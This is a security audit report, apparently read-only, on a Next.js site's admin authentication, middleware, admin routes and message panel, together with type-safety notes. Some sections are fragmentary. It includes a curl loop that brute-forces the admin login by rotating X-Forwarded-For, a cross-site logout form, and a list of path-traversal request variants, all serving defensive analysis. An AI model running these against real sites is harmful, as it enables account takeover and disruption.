Q6. Can attacker brute-force admin password?
================================================================
Status: PARTIAL  | Severity: MED
Location: src/app/api/user/login/route.ts:20-44 (per-route rate limit),
          :60-65 (IP key fallback "unknown"),
          src/middleware.ts:21,144-155 (middleware rate limit),
          src/lib/security.ts:7-17 (isIpBlocked — NOT called by login)

Code:
  login/route.ts:20-21:
    const RATE_LIMIT_WINDOW = 15 * 60 * 1000;
    const RATE_LIMIT_MAX = 5;
  login/route.ts:34-44:
    function checkRateLimit(ip: string): boolean {
      const now = Date.now();
      const record = loginAttempts.get(ip);
      if (!record || now > record.resetAt) { ...new bucket... return true; }
      if (record.count >= RATE_LIMIT_MAX) return false;
      record.count++; return true;
    }
  login/route.ts:56-60:
    const ip = getClientIp(request);
    ...
    const rateLimitKey = ip || "unknown";
    if (!checkRateLimit(rateLimitKey)) {
      return NextResponse.json({ ok: false, error: "rate_limit" }, { status: 429 });
    }
  login/route.ts:71-80: generic "invalid_credentials" message (good —
                       no username enumeration on missing user)
  login/route.ts:83-92: separate "account_inactive"/"account_expired"
                       messages (bad — V17.4-SEC-02 flagged this)

Analysis:
  - Per-IP rate limit: 5 attempts / 15 min. Bcrypt with saltRounds=10
    (~80ms per hash on modern hardware) → 5 attempts / 15 min = 480/day.
    For an 8-char alphanumeric password (62^8 = 2.18e14), this is
    ~1.25e9 days to exhaust. Brute-force is impractical IF the rate
    limit actually binds the attacker.
  - BUT the rate limit is keyed on `getClientIp(request)`:
      getClientIp (access-auth.ts:175-181):
        const forwarded = request.headers.get("x-forwarded-for");
        if (forwarded) return forwarded.split(",")[0].trim();
        const realIp = request.headers.get("x-real-ip");
        if (realIp) return realIp;
        return null;
    The X-Forwarded-For header is FULLY attacker-controlled if the
    deployment is not behind a trusted proxy that overwrites it.
    Already flagged in V17.3-SEC-02 Q11/F-9 (still open per V17.4-SEC-12).
  - Therefore: attacker rotates X-Forwarded-For per request
    (X-Forwarded-For: 1.2.3.4, then 1.2.3.5, ...) → each IP gets its
    own 5-attempt bucket → unbounded brute-force.
  - Additional vectors:
      * middleware.ts:144-155 has a SECOND rate limiter on
        /api/user/login (max=5). It is also keyed on X-Forwarded-For
        (line 145-146) → same bypass. Both rate limiters are
        per-instance in-memory (line 42 of middleware.ts:
        `const rateLimitMap = new Map(...)` and login/route.ts:22
        `const loginAttempts = new Map(...)`) → on any pod restart,
        all counters reset.
      * In a multi-instance deployment (Vercel, k8s with >1 replica),
        each instance has its own Map → effective rate-limit divided
        by instance count.
  - The login route does NOT consult isIpBlocked() (lib/security.ts:8).
    So even IPs that have been auto-blocked via /api/contact's
    recordSuspiciousActivity() mechanism can still attempt login.
  - No CAPTCHA on login (contrast with /api/contact which requires
    reCAPTCHA). No MFA. No account lockout after N failures (only
    rate-limit which is bypassable).
  - username IS case-normalized (login/route.ts:49 .toLowerCase())
    AND the database lookup is by exact username match — so the
    attacker must already know the username (slight barrier; admin
    username is typically "admin" or the site owner's name, both
    discoverable).

PoC:
  # Rotate X-Forwarded-For to bypass both rate limiters:
  for i in $(seq 1 100000); do
    IP="10.0.0.$((i % 256))"
    curl -s -X POST "https://victim.com/api/user/login" \
      -H "Content-Type: application/json" \
      -H "X-Forwarded-For: $IP" \
      -d "{\"username\":\"admin\",\"password\":\"guess$i\"}" \
      > /dev/null
  done
  # Each unique IP gets its own 5-attempt bucket. Effective brute-force
  # rate = network bandwidth, not 5/15min.

Cross-reference:
  - V17.3-SEC-02 Q11/F-9 (XFF spoofable — open).
  - V17.4-SEC-02 R1, R5 (rate-limit weaknesses — open).
  - NEW: no isIpBlocked integration in login flow.

  middleware.ts:159: if ((POST|PUT|DELETE) && !isPublicApi) { ...Origin check... }

Analysis:
  - /api/user/logout is in PUBLIC_API_PREFIXES → middleware does NOT
    enforce the same-origin Origin check on POST.
  - The route handler has ZERO auth check — it deletes whatever
    access_session cookie the browser presents.
  - sameSite=strict on the access_session cookie (login/route.ts:119)
    DOES block cross-site cookie transmission in modern browsers, so
    a CSRF attack that relies on the browser auto-sending the cookie
    to a cross-origin POST is mitigated BY THE COOKIE's sameSite flag,
    not by the route.
  - HOWEVER: sameSite=strict has known edge cases:
      * Browser bugs (older or non-compliant browsers).
      * Same-site subdomain attacks (if any subdomain of victim.com
        is attacker-controllable, e.g. via XSS in a sandboxed
        subdomain, sameSite=strict does NOT block).
      * Browser prefetch/preconnect scenarios.
      * If the cookie was set without sameSite (older cookie set
        before the strict flag was added), it may still be sent.
  - Even if sameSite blocks the cookie send, the logout route has no
    CSRF token, no Origin check, no Referer check. If a future cookie
    config regression drops sameSite=strict (e.g. someone changes it
    to "lax" or "none" for debugging), logout-CSRF becomes trivially
    exploitable.
  - Functional impact of CSRF logout: victim admin is logged out
    (annoying, not data compromise). Could be used as a precursor to
    a credential-phishing attack: log out admin → redirect to fake
    /user-login page → harvest credentials.

PoC:
  <!-- Hosted on attacker.com: -->
  <html><body>
    <form id="f" action="https://victim.com/api/user/logout"
          method="POST" enctype="text/plain">
      <input name="x" value="y">
    </form>
    <script>document.getElementById('f').submit();</script>
  </body></html>
  <!-- If sameSite=strict is correctly enforced, browser DOES NOT send
       access_session cookie → logout fails silently (no effect).
       If sameSite is ever weakened to lax/none, the cookie is sent
       → admin is logged out. -->

Cross-reference:
  - NEW finding. SameSite=strict currently mitigates; the route itself
    is unprotected. Defense-in-depth gap.

================================================================
Status: PASS  | Severity: N/A (with notes)
Location: src/app/api/admin/**/route.ts (all 14 admin route files)

Analysis:
  Per-route audit (read-only inspection of every admin handler):
    /api/admin/equipment GET+POST            → checkAdminAuth ✅
    /api/admin/security-dashboard GET+POST   → checkAdminAuth ✅
    /api/admin/stats GET                     → checkAdminAuth ✅
    /api/admin/nav GET (public items only if !admin) → checkAdminAuth ✅
    /api/admin/text GET (public strings if !admin) → checkAdminAuth ✅
    /api/admin/settings GET+POST             → checkAdminAuth ✅
    /api/admin/content GET+POST              → checkAdminAuth ✅
    /api/admin/reply POST                    → checkAdminAuth ✅
    /api/admin/email GET+POST                 → checkAdminAuth ✅
    /api/admin/providers GET+POST            → checkAdminAuth ✅
    /api/admin/chat-reply POST               → checkAdminAuth ✅
    /api/admin/themes GET (public themes if !admin) → checkAdminAuth ✅
    /api/admin/security GET+POST              → checkAdminAuth ✅
    /api/admin/clear POST                    → checkAdminAuth ✅
    /api/admin/clips GET+POST+DELETE         → checkAdminSession ✅
                                              (admin-session.ts; identical logic)
    /api/admin/users GET+POST                 → local checkAdmin helper ✅
                                              (same getSessionFromRequest+DB+role)
    /api/admin/users/[id] PUT+DELETE          → local checkAdmin helper ✅
    /api/admin/users/logs GET                 → local checkAdmin helper ✅
    /api/messages GET+POST                    → checkAdminAuth ✅
    /api/chat GET (admin listing)             → checkAdminAuth ✅
    /api/bale/webhook GET (setup helper)      → checkAdminAuth ✅
                                              (POST is webhook-secret gated)

  Verdict: every admin route handler calls either checkAdminAuth,
  checkAdminSession, or an equivalent local helper that:
    (1) calls getSessionFromRequest (HMAC-verified)
    (2) loads the user from DB
    (3) checks user.active === true
    (4) checks user.role === "admin"

  No bypass found via route-handler-level auth gap.

  NOTES — findings INSIDE the auth check that this audit surfaced:
    N1. [MED] checkAdminAuth (admin-auth.ts:17-31) does NOT call
        checkAccess(). It checks `user.active` and `user.role`, but
        NOT `user.expiresAt`, NOT `user.allowedHourStart/End`, NOT
        `user.allowedDays`. So an EXPIRED admin (user.expiresAt in
        the past but user.active=true) can still access every admin
        route until either:
          - the 24h session cookie expires
          - an admin sets active=false via /api/admin/users/[id] PUT
        Same for time-restricted admins (allowedDays/allowedHours):
        they can access admin APIs outside their permitted hours.
        Only the /api/user/verify endpoint (used by the dashboard
        client) calls checkAccess(). Admin API routes bypass this.
        Location: src/lib/admin-auth.ts:23-26 (missing checkAccess
        call); src/lib/access-auth.ts:111-150 (checkAccess defined
        but unused by admin-auth.ts).
    N2. [LOW] /api/admin/security-dashboard POST action "clear_logs"
        (security-dashboard/route.ts:76-79) deletes ALL rows from
        the securityLog table with a single `db.securityLog.
        deleteMany({})` call. Combined with Q5 (stolen cookies remain
        valid for 24h after password change), an attacker who has
        stolen an admin cookie can: (a) read sensitive security
        events, (b) wipe ALL audit logs to cover their tracks —
        with a single HTTP request, BEFORE the admin can rotate
        credentials effectively. Even if the admin changes their
        password, the attacker retains log-wiping capability for
        up to 24h.
    N3. [LOW] /api/admin/security-dashboard POST actions "block" /
        "unblock" allow the admin (or any valid-cookie holder) to
        modify the blockedIp table directly. An attacker with a
        stolen cookie could unblock their own attacking IP and
        block legitimate users' IPs (DoS).
    N4. [LOW] /api/admin/clear POST target="chat_all" / "message_all"
        (clear/route.ts:33-57) wipes ALL chat sessions / contact
        messages with a single request. Same stolen-cookie risk.

Cross-reference:
  - V17.4-SEC-12 Q2 (unauth /api/chat/messages) — confirmed: that
    route is intentionally public (no checkAdminAuth) per its design.
    Not an admin route, not in scope of this audit's FAIL list.

Q9. Middleware matcher complete?
================================================================
Status: PARTIAL  | Severity: LOW
Location: src/middleware.ts:220-228 (matcher config),
          :24-37 (PUBLIC_API_PREFIXES), :144-193 (route gates)

Code:
  middleware.ts:220-228:
    export const config = {
      matcher: [
        "/((?!_next/static|_next/image|favicon.ico|.*\\.(?:png|jpg|jpeg|gif|webp|svg|ico|txt|xml|css|js|woff|woff2|ttf|eot)$).*)",
      ],
    };

Analysis:
  - The matcher excludes only static assets (_next/static, _next/image,
    favicon.ico) and a hardcoded set of file extensions. EVERYTHING
    else (including /api/*, /user-dashboard, /user-login, /, /api/
    admin/*, /api/chat/messages, etc.) is matched.
  - The matcher is COMPREHENSIVE — every dynamic path runs through
    middleware. ✅
  - The PROTECTION applied to matched paths is INCONSISTENT:
    P1. /user-dashboard            → hasValidSession (structural only — Q1)
    P2. /api/admin/*                → hasValidSession (structural only — Q1)
    P3. /api/messages              → hasValidSession (structural only — Q1)
    P4. /api/user/login, /api/contact, /api/chat → rate limit (XFF-keyed — Q6)
    P5. POST/PUT/DELETE on non-public paths → Origin/Host CSRF check ✅
    P6. POST/PUT/PATCH body size   → 1MB cap ✅
    P7. Security headers (CSP, HSTS on https, XFO, etc.) → all paths ✅
  - Paths EXPLICITLY exempted from session check via
    PUBLIC_API_PREFIXES (line 24-37):
      /api/content, /api/clips, /api/track, /api/user/login,
      /api/user/verify, /api/user/logout, /api/contact, /api/chat,
      /api/bale/webhook, /api/telegram/webhook, /api/rss, /api/sitemap
  - Of these, /api/user/verify is the most security-sensitive — it
    reveals the user object (id, username, displayName, role,
    permissions, allowedHours, allowedDays, expiresAt, active,
    lastLoginAt) for ANY valid cookie. With a forged cookie (Q4) the
    endpoint returns {ok:false} because it calls getSessionFromRequest
    (HMAC verified). ✅ Not exploitable.
  - /api/chat is in PUBLIC_API_PREFIXES for the POST (visitor sends
    chat messages) but ALSO exposes a GET handler (chat/route.ts:231)
    that REQUIRES admin auth. The middleware does NOT distinguish
    method when applying PUBLIC_API_PREFIXES — so the admin GET is
    ALSO exempted from the middleware session check. Defense-in-depth
    via checkAdminAuth inside the route handler (chat/route.ts:236)
    catches it. ✅ But the design is fragile: if anyone adds a new
    admin method to /api/chat without calling checkAdminAuth, it
    becomes immediately public.
  - /api/bale/webhook and /api/telegram/webhook are public for POST
    (webhook secret gated inside the handler) — correct.
  - /api/user/login being public-POST is correct (must accept
    unauthenticated login attempts).
  - /api/user/logout being public-POST is the CSRF gap from Q7.

  Findings:
    F1. [LOW] PUBLIC_API_PREFIXES is a FLAT list — there is no way
        to say "public for POST but admin-gated for GET". The /api/chat
        admin GET relies entirely on per-handler checkAdminAuth.
    F2. [LOW] matcher uses case-sensitive regex without `i` flag.
        Next.js App Router routes ARE case-sensitive (a request for
        /API/admin/equipment returns 404), so this is not exploitable
        via path-case variation. But it is a latent footgun: if a
        future Next.js version (or a configuration like
        `caseSensitive: false` in next.config) lowercases route paths
        before matching, the middleware's `pathname.startsWith("/api/
        admin/")` would not match `/API/admin/equipment` and the
        middleware gate would be bypassed for any route whose
        handler doesn't independently call checkAdminAuth.
    F3. [INFO] The matcher excludes file extensions including .js
        and .css. Any future API route that legitimately uses an
        extension-like suffix (e.g. /api/admin/export.json) would
        be exempted from middleware. Currently no such route
        exists.

Cross-reference:

Q10. Path traversal bypass?
================================================================
Status: PASS  | Severity: N/A (with notes)
Location: src/middleware.ts:138-214 (main middleware), :180-193 (admin
          path checks), :220-228 (matcher)

Analysis:
  - Middleware uses `req.nextUrl.pathname` (middleware.ts:139) which
    Next.js normalizes (collapses duplicate slashes, resolves . and ..
    segments, decodes %-encoding) BEFORE exposing to middleware. So
    traditional path-traversal patterns like /api/admin/../admin/
    equipment or /api/admin/%2e%2e/admin are normalized away.
  - The check `pathname.startsWith("/api/admin/")` (line 188) is
    evaluated on the normalized pathname, so:
      /api/admin//equipment   → normalized to /api/admin/equipment → matches ✅
      /api/admin/equipment/   → preserved (Next.js does not strip trailing
                                slash) → still starts with /api/admin/ → matches ✅
      /api/admin/equipment?x  → query stripped from pathname → matches ✅
      /api/admin/%65quipment → decoded to /api/admin/equipment → matches ✅
      /api/admin/./equipment → normalized → matches ✅
      /api/admin/../admin/equipment → normalized to /api/admin/equipment → matches ✅
      /API/admin/equipment    → not normalized (case-sensitive) →
                                does NOT match middleware check.
                                BUT Next.js routing is case-sensitive →
                                returns 404 before reaching handler.
                                Not exploitable. (See Q9 F2 for latent
                                risk if routing becomes case-insensitive.)
  - No file-system path operations in any auth-checked admin route
    handler expose path traversal:
      * All DB access uses Prisma parameterized queries
        (db.*.findUnique/findMany/update/delete with `where: { id }`).
      * The only String() coercions of body.id/body.sessionId etc.
        pass to Prisma `where` clauses, which are SQL-parameterized
        under the hood.
      * No use of fs.readFile/fs.writeFile/path.join with
        user-controlled segments in any inspected route.
  - Path-traversal via the bale/telegram webhook secret query param
    (webhook/route.ts:19) — the `secret` value is compared via
    timingSafeEqual, not used as a path. ✅
  - Path-traversal via cookie value parsing (middleware.ts:81) — the
    decoded cookie value is split on "." and used only as a string
    for comparison. Not used as a path. ✅

  Notes:
    N1. [INFO] /api/admin/users/[id]/route.ts:36 destructures
         `const { id } = await params;` and passes it to
         `db.accessUser.findUnique({ where: { id } })`. The `id`
         comes from the URL path segment, which Next.js decodes but
         does not sanitize. However, since it's a Prisma primary-key
         lookup (string), any non-existent id simply returns null →
         404. No path traversal possible.
    N2. [INFO] /api/admin/content/route.ts:72 `const model =
         models[type];` — the `type` body field indexes into a
         hardcoded object literal (line 64-70) of allowed Prisma
         models. Unknown types return null → 400 invalid_type. No
         prototype-pollution or path-traversal vector. ✅
    N3. [INFO] /api/admin/equipment/route.ts:91-115 bulk_import:
         item.specs is JSON.parse'd (line 112) inside try/catch; bad
         JSON is rejected with a `failed++` counter, not exposed.
         No prototype pollution (JSON.parse is safe by default).

Cross-reference:
  - NEW audit. No prior V17.x audit specifically covered middleware
    path-traversal — this confirms the current normalization +
    Prisma parameterization is sound.

SUMMARY
================================================================

Auth chain status:
  ✅ Password fallback removed (Q2) — backdoor closed.
  ✅ HMAC + timingSafeEqual implementation correct (Q3).
  ✅ Every admin route handler independently re-verifies auth (Q8).
  ✅ No path-traversal bypass (Q10).
  ✅ Middleware matcher is comprehensive (Q9 F1-F3 are design
     fragilities, not bypasses).

Auth chain weaknesses (severity-ordered):
  [HIGH] Q5 — Stolen cookie remains valid up to 24h after password
         change. No server-side session state, no token-version
         field, no targeted revocation mechanism. An attacker who
         exfiltrates a cookie via XSS / log leak / proxy compromise
         retains full admin API access for the full 24h cookie
         lifetime regardless of any password rotation by the admin.
         Location: src/lib/access-auth.ts:67-72 (token format),
                   src/app/api/admin/security/route.ts:56-99
                   (change_password — no session invalidation).
  [HIGH] Q1 — Middleware hasValidSession() does NOT verify HMAC.
         Forged cookies pass the middleware gate. Currently mitigated
         by per-route checkAdminAuth (Q8) which DOES verify HMAC, so
         functional compromise is limited to: rendering the
         /user-dashboard HTML shell (client-side JS bounces to
         /user-login via /api/user/verify). The risk is LATENT: any
         future admin route added without checkAdminAuth becomes
         immediately accessible to anyone who can construct a
         base64-encoded "userId.expiresAt.sig" string.
         Location: src/middleware.ts:70-93 (hasValidSession).
  [MED]  Q6 — Brute-force rate limit (5/15min/IP) is bypassable
         via X-Forwarded-For rotation. XFF is fully attacker-
         controlled if the deployment is not behind a trusted
         proxy. No CAPTCHA, no MFA, no isIpBlocked() integration
         in the login route. No account lockout.
         Location: src/app/api/user/login/route.ts:20-44, 56-65.
  [MED]  Q4 — Cookie forging yields a denial-of-service AMPLIFIER
         (forged cookies pass cheap middleware check, then trigger
         DB-bound API calls that reject at HMAC verification — but
         the DB query happens AFTER the HMAC check, so the only
         cost to the attacker is HTTP round-trip).
         See Q1 for full implications.
  [MED]  Q8-N1 — checkAdminAuth does NOT call checkAccess(). Expired
         admins and time-restricted admins can still access admin
         routes outside their permitted window until the 24h session
         expires or admin is deactivated. Only /api/user/verify
         (used by the dashboard client) enforces time-window.
         Location: src/lib/admin-auth.ts:17-31.
  [LOW]  Q7 — Logout is NOT CSRF-protected at the route level.
         Currently mitigated by sameSite=strict on the cookie; a
         future cookie-config regression would expose CSRF logout.
         Location: src/app/api/user/logout/route.ts:7-11,
                   src/middleware.ts:24-37 (PUBLIC_API_PREFIXES).
  [LOW]  Q8-N2/N3/N4 — Destructive admin endpoints (clear_logs,
         clear chat_all/message_all, block/unblock IP) are reachable
         with any valid admin cookie — including a stolen one whose
         validity persists 24h post-password-change (Q5). Combined
         risk: attacker can read sensitive security events AND
         wipe the audit trail in a single request, defeating
         forensic investigation.
         Location: src/app/api/admin/security-dashboard/route.ts:76-79,
                   src/app/api/admin/clear/route.ts:33-57,
                   src/app/api/admin/security-dashboard/route.ts:60-75.
  [LOW]  Q9-F1 — PUBLIC_API_PREFIXES is a flat list; cannot express
         "public-POST, admin-GET" per method. /api/chat admin GET
         relies entirely on per-handler checkAdminAuth. Latent gap.
  [LOW]  Q9-F2 — Matcher regex is case-sensitive without `i` flag.
         Currently not exploitable (Next.js routing is case-sensitive)
         but a future Next.js config change could expose it.
  [INFO] Q3-notes — verifySessionToken does cheap early-rejects
         (NaN check, expiry check) before the timingSafeEqual call,
         leaking coarse timing info. Not exploitable because the
         distinction is only useful to an attacker who already
         knows SESSION_SECRET (in which case the token is fully
         forgeable regardless).

Action items RECOMMENDED (not performed — read-only audit):
  R1. [HIGH] Add a `tokenVersion` Int column to AccessUser. Bump it
      in change_password (security/route.ts). Verify tokenVersion
      inside verifySessionToken by including it in the HMAC payload.
      This invalidates all prior sessions of THAT user only on
      password change.
  R2. [HIGH] Verify HMAC inside middleware.hasValidSession().
      process.env IS available in Edge runtime — the comment at
      middleware.ts:87-88 is mistaken. Either:
        (a) import hmac from access-auth.ts and call verifySessionToken
            (requires refactoring middleware to async, since
            verifySessionToken is sync — actually it is sync, so
            just call it directly), OR
        (b) inline a duplicate hmac call using process.env.SESSION_SECRET.
  R3. [MED]  Replace XFF-based IP keying with a trusted-proxy-aware
      getClientIp: either trust only the LAST IP in X-Forwarded-For
      chain, or use a separate trusted header set by your reverse
      proxy (Caddy/nginx). Apply uniformly across middleware +
      login route + chat route + contact route.
  R4. [MED]  Add isIpBlocked() check at the top of the login route.
      Auto-block after N failed logins (currently only /api/contact
      auto-blocks via recordSuspiciousActivity).
  R5. [MED]  Add checkAccess() call inside checkAdminAuth so
      expired/time-restricted admins cannot reach admin APIs.
  R6. [LOW]  Add Origin check (or CSRF token) to /api/user/logout.
      Remove it from PUBLIC_API_PREFIXES or special-case it in
      the CSRF check.
  R7. [LOW]  Add a confirmation step / 2FA re-authentication before
      destructive admin actions (clear_logs, clear chat_all,
      clear message_all, unblock_ip).
  R8. [LOW]  Express per-method public/admin classification — either
      split PUBLIC_API_PREFIXES into PUBLIC_GET / PUBLIC_POST lists,
      or move the /api/chat admin GET to /api/admin/chat (its proper
      location).

6. `as any` casts
================================================================
Verdict: WARN ⚠️   (6 instances — none fatal; most are escape hatches)

  1. src/app/api/admin/security/route.ts:48
       `const ip = getClientIp(req as any);`
       Reason: getClientIp signature likely expects NextRequest,
       but route handler receives plain `Request`. The cast
       bypasses the typing mismatch. Compounded by the fact that
       the variable `ip` is never read (see §5).
       Severity: LOW (the cast itself is a typing smell; the dead
       store is the bigger problem).

  2. src/app/page.tsx:350
       `const recaptchaResponse = (window as any).grecaptcha?.getResponse();`
       Reason: Google reCAPTCHA's `grecaptcha` global is not
       typed in the project (no `@types/recaptcha` installed).
       The cast is the conventional escape hatch for untyped
       third-party globals.
       Severity: LOW (acceptable pattern, but adding
       `@types/recaptcha` or declaring a `declare global`
       interface in next-env.d.ts would be cleaner).

  3. src/app/page.tsx:689
       `onItemClick={(t) => setActiveTutorial(t as any)}`
       Reason: type of `t` (from child component) does not match
       `setActiveTutorial`'s expected argument type. The cast
       papers over the mismatch.
       Severity: LOW-MED (real type drift between child and
       parent; should be fixed by aligning the type, not casting).

  4. src/app/page.tsx:849
       `{(activeTutorial as any)?.[`
         title${lang.charAt(0).toUpperCase() + lang.slice(1)}
       `] || activeTutorial?.titleEn}`
       Reason: dynamic property access — the property name is
       computed at runtime (`titleFa`, `titleDe`, `titleEn`),
       but the TutorialItem interface probably declares only
       static keys. The cast enables bracket lookup.
       Severity: LOW (acceptable pattern for i18n lookup if the
       object is intentionally indexable; otherwise a typed
       accessor function would be safer).

  5. src/app/page.tsx:871
       `title={(activeTutorial as any)?.[`
         `title${lang.charAt(0).toUpperCase() + lang.slice(1)}`
       `] || activeTutorial?.titleEn || "Tutorial"}`
       Reason: same as #4.
       Severity: LOW (same as #4).

  6. src/components/ArchiveGrid.tsx:97
       `onChange={(e) => setSortBy(e.target.value as any)}`
       Reason: `setSortBy` expects `"order" | "year" | "date" |
       "title"` (a discriminated union) but `e.target.value` is
       `string`. The cast suppresses the mismatch instead of
       narrowing at runtime.
       Severity: LOW-MED (an attacker-controlled form value could
       be passed through; safer to validate the string against the
       union before calling setSortBy).

Plus 1 related "as unknown as" cast:
  7. src/lib/db.ts:8
       `const globalForPrisma = globalThis as unknown as {`
       `   prisma: PrismaClient | undefined`
       `};`
       Reason: standard Prisma pattern for hot-reload-safe
       singleton client. The double cast is required because
       `globalThis` cannot be extended with arbitrary keys
       without it. This is the canonical Prisma snippet from
       their docs.
       Severity: NONE (correct usage).

                                          correctly typed as Promise for
                                          Next.js 16 async params)

Verdict: PASS ✅ — 100% of API routes have typed signatures.

Caveats (not FAILs, but worth noting):
  C1. Mixing `Request` and `NextRequest` across the API surface.
      Files using plain `Request` (NextResponse.json pattern) cannot
      access `next/` features like `cookies()` directly via the
      request object — they go through `getSessionFromRequest(req)`
      helpers in `src/lib/access-auth.ts` which presumably read
      cookies via `req.headers.get("cookie")`. This is consistent
      with the codebase but means some routes (e.g. /api/admin/clips
      using NextRequest) and others (e.g. /api/admin/clips's
      sibling /api/admin/themes using Request) differ in capability.

  C2. `src/app/api/admin/users/[id]/route.ts:46` declares
      `const data: any = {};` — a typed-`any` accumulator for the
      Prisma update payload. This is a `: any` annotation, not an
      `as any` cast (so not counted in §6) but it is a typing
      escape hatch: Prisma's generated `AccessUserUpdateInput`
      type would be safer.

  C3. `src/app/api/admin/equipment/route.ts:117` declares
      `catch (e: any) {` — the only catch-block in the codebase
      that opts into `any` (all other 49 catch blocks use the
      implicit `unknown` from `useUnknownInCatchVariables` per
      `strict: true`). Severity LOW.

================================================================
10. noImplicitAny
================================================================
Status: ENABLED ✅

Mechanism: tsconfig.json line 11 — `"strict": true`.
The `strict` flag is a master switch that enables (per TypeScript
docs) the following:
  noImplicitAny              ← this audit's target
  noImplicitThis
  alwaysStrict
  strictBindCallApply
  strictNullChecks
  strictFunctionTypes
  strictPropertyInitialization
  useUnknownInCatchVariables

So implicit `any` IS rejected by tsc (and by `next build`). The
remaining `any` occurrences in the codebase are all EXPLICIT
(`: any` annotations or `as any` casts), which `strict` mode
does NOT forbid — it only forbids the IMPLICIT form
(`function f(x) {}` where x has no annotation).

Cross-check: §1 tsc --noEmit passes, confirming no implicit-any
errors. §6 lists 6 explicit `as any` casts and §8 lists ~30
explicit `: any` annotations — all legal under strict mode but
advisory concerns for type-safety hygiene.

      state ("پیامی دریافت نشده." / "No messages." / "Keine
      Nachrichten.") with ZERO indication that anything went wrong.
      Indistinguishable from "the inbox is genuinely empty".
      Contrast with the `!data.ok` branch at :371-372 which DOES
      set both. Inconsistent error handling.

  (b) DUAL DISPLAY ON LOAD FAILURE — page.tsx:437-449
      When data.ok === false, BOTH `setError(...)` AND `setMessages([])`
      are called. The render at :437-441 shows the error banner, then
      at :447-449 also shows the empty-state paragraph (because
      messages.length === 0). User sees simultaneously:
          [Error: load_failed]
          💡 پیام‌هایی که بازدیدکنندگان ...
          پیامی دریافت نشده.
      Contradictory UX — error says load failed, empty-state says
      no messages exist.

  (c) NO MANUAL REFRESH — page.tsx:435-503
      No "Refresh" / "Reload" button anywhere in the panel. The only
      way to re-fetch is to switch tabs away and back (which unmounts
      and remounts the component, re-triggering useEffect). An admin
      who leaves the panel open cannot manually poll for new inbound
      messages.

  (d) No polling / no WebSocket / no SSE — the inbox is a snapshot
      from the moment of mount. New contact-form submissions arriving
      after mount are invisible until the admin navigates away+back.

  (e) Backend gate — /api/messages/route.ts:9-17 requires
      checkAdminAuth(req, password). checkAdminAuth
      (admin-auth.ts:17-31) uses cookie-only (password param ignored
      per V17.2 backdoor-removal comment at admin-auth.ts:4-6).
      Panel correctly sends credentials: 'include' (:366). Auth OK.

  (f) Backend cap — /api/messages/route.ts:22 returns at most
      `take: 100` rows. See #10 for pagination analysis.

#2. sendReply (refreshes list?)  —  PARTIAL / MED
----------------------------------------------------------------
Location: src/app/user-dashboard/page.tsx:379-402

  async function sendReply(msgId: string) {
    if (!replyText.trim()) return;                                  // :380  ← (a)
    try {
      const res = await fetch("/api/admin/reply", {                 // :382
        method: "POST",
        headers: { "Content-Type": "application/json" },
        credentials: "include",                                     // :385  ✓
        body: JSON.stringify({ messageId: msgId, reply: replyText }), // :386
      });
      const data = await res.json();
      if (data.ok) {
        setReplyingTo(null);                                         // :390
        setReplyText("");                                            // :391
        // Refresh messages
        const refreshRes = await fetch("/api/messages", { credentials: "include" }); // :393
        const refreshData = await refreshRes.json();
        if (refreshData.ok) setMessages(refreshData.messages || []); // :395
      } else {
        setError(data.error || "reply_failed");                    // :397
      }
    } catch {
      setError("network");                                           // :400
    }
  }

Question: does sendReply refresh the list?  → YES, on success only.

Findings:
  (a) EMPTY-REPLY SILENT RETURN — page.tsx:380
      `if (!replyText.trim()) return;` returns with NO user feedback.
      No error, no toast, no shake animation. The Send button appears
      to do nothing. Should at minimum show "reply_empty" error.

  (b) REFRESH-FETCH ERROR SWALLOWED — page.tsx:393-395
      The refresh fetch (line 393) only handles `refreshData.ok`. If
      `refreshRes.json()` throws (e.g. non-JSON 500 response) OR if
      `refreshData.ok === false` (e.g. cookie expired between the
      successful reply POST and the subsequent GET), the code falls
      through silently — NO setError, NO console.warn. The reply WAS
      saved server-side (POST /api/admin/reply returned ok at :389),
      but the local UI never shows it. The admin sees the textarea
      close and assumes their reply wasn't sent (because the reply
      doesn't appear under the message), so they may submit again —
      causing duplicate replies.

  (c) NO IN-FLIGHT DISABLE — page.tsx:493
      The Send button at :493 has `onClick={() => sendReply(msg.id)}`
      with no `disabled` state. While `await fetch(...)` is in
      flight, the button remains enabled. A fast double-click fires
      two POSTs to /api/admin/reply with the same body. Backend
      (route.ts:43-45) does an unconditional `db.messageReply.create`
      with no idempotency key → two duplicate replies persisted in DB.
      Same applies to the Cancel button at :494 — cancelling mid-
      send doesn't abort the fetch.

  (d) ERROR NOT CLEARED ON SUCCESS — page.tsx:389-395
      When sendReply succeeds, the code does NOT call setError("").
      A previously-displayed error (e.g. from a prior failed delete
      or load) remains visible after a successful reply. The banner
      at :437-441 keeps showing stale error text.

  (e) Body shape mismatch is harmless — page.tsx:386
      Panel sends `{ messageId, reply }` without a `password` field.
      Backend route.ts:20-21 reads `body.password` and passes it to
      checkAdminAuth, but checkAdminAuth (admin-auth.ts:17-31)
      ignores the password parameter entirely (cookie-only since
      V17.2). So the missing password is harmless today, but the
      route still reads it from the body — dead code.

  (f) Reply length cap asymmetry — page.tsx:386 vs reply/route.ts:26
      Panel sends the raw replyText (no client-side cap).
      Backend route.ts:26 trims+slices to 5000 chars:
        `String(body.reply || "").trim().slice(0, 5000)`
      So a 6000-char reply is silently truncated to 5000 server-side
      with NO error returned to the client. The admin's "sent"
      reply differs from what they typed but the UI shows the
      original full text in the (refreshed) list — wait, no: the
      refresh fetches from DB, which has the truncated version.
      So the admin sees their full 6000-char text replaced by a
      5000-char version after refresh. No client-side maxlength on
      the textarea (page.tsx:484-490 has no maxLength attribute).

Findings:

  (b) PASS — non-optimistic: only filters state AFTER `data.ok`
      (:414-415). On failure the list is left intact. Good.
  (c) PASS — error path sets localized-or-server error string.

      notes, tag-relations, then the message row. No orphans.

      Same double-submit risk as #2(c) but lower impact because the
      backend `db.contactMessage.delete` on a missing id throws,
      caught by route.ts try/catch → 500 → setError("server_error")
      (since the message was already deleted by the first call, the
      second call's `delete` throws P2025 "Record to delete does
      not exist"). So duplicates are server-rejected, but produce
      a confusing "server_error" message on the second click.
  (g) LOW — ERROR NOT CLEARED ON SUCCESS — :414-415
      On successful delete, setError("") is not called. Stale errors
      from prior operations remain visible after a successful delete.

#4. credentials: 'include'  —  PASS / —
----------------------------------------------------------------
All four fetch calls inside MessagesPanel include `credentials: "include"`:

  page.tsx:366  fetch("/api/messages",       { credentials: "include" })      // initial load
  page.tsx:382  fetch("/api/admin/reply",    { ..., credentials: "include" }) // send reply
  page.tsx:393  fetch("/api/messages",       { credentials: "include" })      // post-reply refresh
